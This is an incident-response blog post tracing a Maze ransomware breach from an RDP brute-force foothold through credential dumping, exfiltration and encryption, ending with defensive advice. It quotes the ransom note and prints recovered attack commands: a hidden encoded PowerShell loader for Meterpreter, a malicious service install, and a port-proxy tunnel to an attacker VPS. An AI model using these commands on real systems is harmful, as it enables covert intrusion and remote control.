---
title: "Blog: Walking Through a Maze(Ransomware Attack)"
excerpt: "Break down of the Maze gang(TA2101) TTPs."
author_profile: false
header:
  teaser: "/assets/images/Maze.png"
tags: 
  - Malware
  - Ransomware
  - Maze
---

### Walk-through of a recent breach by the Maze gang(TA2101)


<figure>
	<a href="/assets/images/Maze.png"><img src="/assets/images/Maze.png"></a>
</figure>

The sudden realisation of being a victim of a ransomware attack is a feeling not many hopefully will have to experience, however, for the few that do, I can only imagine the heart sinking feeling of turning a screen on and seeing the following message:

> Attention!
>
> What happened?
>
> We hacked your network and now all your files, documents, photos, databases, and other important data are safely encrypted with reliable algorithms.
> You cannot access the files right now. But do not worry. You can get it back! It is easy to recover in a few steps.
>
> We have also downloaded a lot of private data from your network, so in case of not contacting us as soon as possible this data will be released.
> If you do not contact us in a 3 days we will post information about your breach on our public news website and after 7 days the whole downloaded info.
>
> To see what happens to those who don't contact us, google:
> * Southwire Maze Ransomware
> * MDLab Maze Ransomware
> * City of Pensacola Maze Ransomware
>
> After the payment the data will be removed from our disks and decryptor will be given to you, so you can restore all your files.

The text above is saved as a desktop background for any PC that has been encrypted by the Maze Ransomware attackers. The text continues and mentions about installing TOR to access a URL that will allow you to speak to the ‘support staff’ at Maze. It also contains a public key that is relevant to the specific attack by Maze and how you will need to upload the file to the Maze site in order to identify yourself and discuss paying the ransom. 
The current tactics of Maze are to not only encrypt your data, but ex-filtrate it to their servers where they will hold it until you make the requested ransom payment. 

Whilst not strictly sticking to the specific time frames, Maze are true to their word and regularly update their site of companies who have failed to make contact or payments.

So, how would a company arrive to be in this situation? Well, I was recently tasked with answering that exact question, and through forensic acquisition and analysis I can provide a walkthrough of a Maze attack, and importantly what to do to avoid it happening to you and your organisation. Or if you have already fallen victim to Maze, what to do after the incident and how to respond accordingly. 

So to paint the scene, we have arrived on site, secured the systems and network, taken forensic images of all the affected devices and where required ensured that there is no possibility of persistence by resetting all passwords of any corporate information systems, such as emails, desktops and so on. 
Now that we have recovered the infected images to our labs, we can begin the investigation. 

### The Foothold 

Every attack that involves some form of remote code execution has to start somewhere, and that is what is known as ‘The Foothold’ - hackers have to gain this crucial first step in order to move laterally within a network and perform any reconnaissance of further exploit avenues. 

Maze tactics are to aim for low hanging fruit, and most often this is an open Remote Desktop Protocol that is accessible from anywhere on the Internet. 
Looking through the logs of one device that was exposed to the Internet with the RDP port open, we can instantly see there has been a sustained brute-force attack against the server for several months. Below you can see the number of failed logins for only one month of logs. 

<figure>
	<a href="/assets/images/RDP-BF.png"><img src="/assets/images/RDP-BF.png"></a>
</figure>

Then after several months of trying the attackers are successful at logging into the server. The logs show our first entry point, and no prizes for guessing where the attacker is from:

<figure>
	<a href="/assets/images/RU-IP.png"><img src="/assets/images/RU-IP.png"></a>
</figure>

An interesting point to highlight is that the attackers are not wasting time with low privilege accounts are only attempting to log in with Administrator style user names. As you can see from the failed logins, they are only using several variations. 

So, we are now at the point where the attackers have access to a server on an internal network. Their next task is to carry out reconnaissance of the victim server and other servers they might want to access. 

### Lateral Movement 

Now the attackers have access to the internal network, with a Domain Administrator account no less, they will attempt to enumerate other hosts and services running on the network. To do this the attackers download a network scanning tool to the server on the Administrator desktop, this also includes their licence and configuration for the tool of what they want to check across the network.

The attackers are also clearly automating all of this, as the logs show an connection and the command 'nslookup' being used to find the Domain Controller, then instantly disconnecting. 

Thankfully, these servers are backing up to a separate cloud storage container quite frequently, meaning we can see the files that have been captured by the backup, even though the attackers try and clean up after themselves by periodically deleting files. 

The three files the attacker place on the infected PC are:

<figure>
	<a href="/assets/images/net64.png"><img src="/assets/images/net64.png"></a>
</figure>

As mentioned, this the network scanning tool, licence, and configuration file, running the net64.exe also confirms the language of the attackers:

<figure>
	<a href="/assets/images/tool.png"><img src="/assets/images/tool.png"></a>
</figure>

The executable seen in the image above, ‘net64.exe’ is a portable network scanner that can be deployed by an automated process with a licence and configuration file. The configuration file included in this case shows that the tool is setup to search across the network for the following IP ranges and ports:

<figure>
	<a href="/assets/images/config.png"><img src="/assets/images/config.png"></a>
</figure>

The tool will scan everything on the given network range from 192.168.0.0 to 192.168.255.255 for live hosts. Once a live host has been found it will check for open port numbers in the above image. 
If the tool identifies open ports such as remote terminal services, it will attempt to use stored credentials and authenticate to the service, reporting if successful or not.  

### Further Exploitation 

Once the attackers became aware that they had access to the network via their automated tools, they proceeded to carry out further exploitation techniques, such as password dumping. To do this the attackers placed known exploitation tools such as Mimikatz and NPRW on the DC. Attackers commonly use Mimikatz to steal credentials and escalate privileges: in most cases, endpoint protection software and anti-virus systems will detect and delete it. 
NPRW stands for Network Password Recovery Tool and is used to scan the system for user stored credentials. This is a commercially available piece of software that appears to originate from Russia. 

<a href="https://www.passcape.com/network_password_recovery">Checkout NPRW here</a> 

When the attackers attempted to run this tool, one of the processes it uses triggered the Cylance end point protection as a known malicious tool. 

In total, thirty-seven attempts were detected of the process ‘loader64.exe’ 

During the investigation process it was also noticed that the attack team were systematically removing tools in attempt to remain undetected. Various backups where showing that tools being installed were quickly deleted not long after use, so daily backups are essential!

At this stage of the investigation the attackers have compromised all hosts on the network, even with Cylance deployed. 

### Cylance Detection

It is worth noting that whilst Cylance has detected multiple instances of various threats, it did allow for attacks to get through. This is due to poor configuration of the Cylance deployment with a combination of a poor monitoring service. 

### Data Exfiltration 

Once the attack team had managed to acquire all necessary privileges to access any machine across the network, they then proceeded to extract data to a VPS. 

Reviewing the logs of the DC showed that Cylance detected potentially malicious PowerShell activity and stopped the running process a number of times before the attackers simply switched off Cyalnce, allowing them to carry out further attacks unhindered. 

The PowerShell logs indicated the attackers used a tactic known as a ‘Fileless attack’ which is a type of memory-based malware. This is purposely used to prevent the possibility of digital forensics, as shutting down or rebooting the server will wipe the memory and the evidence along with it. Thankfully, it was possible to recover the commands from System logs used to carry out this exploit.

To conduct this attack, the following commands were added to a Windows Registry key value, so that when that process began, the subsequent PowerShell commands were executed. These commands have been broken down below for a clearer understanding of their purpose and intention. 

```sh
%COMSPEC% /b /c start /b /min powershell -nop -w hidden -enCodedcommand [base64 string]
```

The decoded base64 string shows the following:

```sh
$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(more base64) "));IEX 
	(New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

Within the second base64 encoded string is a compiled Meterpreter binary. This script allocates memory, resolves WinAPIs and downloads the Meterpreter utility directly to RAM.

After the successful generation of a script, the attackers used the SC utility to install a malicious service (that will execute the previous script) on the target host. This is done by using the following command:

```sh
sc \\DC-IP create ATITscUA binpath= “C:\Windows\system32\cmd.exe /b /c start /b /min powershell.exe -nop -w hidden e aQBmACgAWwBJAG4AdABQAHQA...” start= manual
```

The next step after installing the malicious service is to set up tunnels to access to the infected machine from a remote host, using the following command:

```sh
netsh interface portproxy add v4tov4 listenport=4444 connectaddress=Attacker-VPS connectport=4443 listenaddress=0.0.0.0
```

Running this command would result in all network traffic from DC-IP:4444 being forwarded to Attacker-VPS:4443. This technique of setting up proxy tunnels will provide the attackers with the ability to control any PowerShell infected host from remote Internet hosts.

Looking at the attacking host IP on Shodan shows that it is a Kali Linux server based in Romania. Kali Linux is a well-known penetration testing operating system designed by OffSec and is freely available for download or deployment by many cloud hosting platforms. 

<figure>
	<a href="/assets/images/VPS.png"><img src="/assets/images/VPS.png"></a>
</figure>

### Malware Execution 

The attack team initiated the installation of the malicious files that would encrypt all the user data on the compromised devices as the final stage. The following is a breakdown of how the malware operates and encrypts files on the infected hosts. 

The malware uses two algorithms to encrypt files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric. 

In each execution the malware creates a Public BLOB of one RSA key that will be used to encrypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information encrypted with the public RSA blob created previously.

After this, the malware starts the procedure of encrypting the files, searching in units, before importing the RSA public BLOB key generated in runtime. Then it creates the ransom note prepared for the infected machine in the root folder and then starts looking for folders and files to encrypt. At the point all files are encrypted the malware stops and removes the binaries and Dynamic-Link Libraries (DLL) that it has utilised to complete the attack. 

I also observed remnants of the malicious payloads that had been captured during the forensic acquisition. This became apparent when carrying out the investigation and found a copy of the payload in the same location as the log files in a possible attempt to prevent analysis or an investigation. Due to the way the I was able to conduct static analysis of the device files, it was clear that there was an attempt at a persistent threat on the devices. The malicious file was safely removed to continue the investigation. 

The malicious payload operates under strict criteria and will only encrypt certain files and folders. Where it does encrypt data, it leaves a copy of the ransom note. 

The following locations were found to be excluded from being encrypted:

-	Windows main directory.
-	Games
-	Tor Browser
-	ProgramData
-	cache2\entries
-	Low\Content.IE5
-	User Data\Default\Cache
-	All Users
-	Local Settings
-	AppData\Local
-	Program Files

The malware ignores these file extensions:

-	LNK
-	EXE
-	SYS
-	DLL

The malware also has a list of filenames that will not be encrypted:

-	inf
-	ini
-	ini
-	dat
-	db
-	bak
-	dat.log
-	db
-	bin
-	DECRYPT-FILES.txt

So we are now at the stage where all data has been uploaded to the attacker VPS, all files on the devices across the network are encrypted and left with the ransom note on the desktop. 

After navigating to the URL provided by the Maze team, I discussed with them the attack and how much they wanted for the decrypt key, I got the following answer:

<figure>
	<a href="/assets/images/million.png"><img src="/assets/images/million.png"></a>
</figure>

The client chose not to pay, wipe their servers and devices, restore from known safe back ups and take appropriate actions in regards to informing the ICO.

A couple of final points from me

1. logs, logs, logs - make sure everything is logging and backing up somewhere, this breach was active for nearly 30 days before being detected, would your systems be able to retrieve logs that far back? 
2. Make sure your end point protection is properly deployed and cannot be disabled locally. 
3. RPD open to the INTERNET? Please don't. If you can use Security Groups to apply IP Allow Rules, or use a gateway that can detect and block brute-force attacks and ensures users authenticate with Multi Factor Authentication. 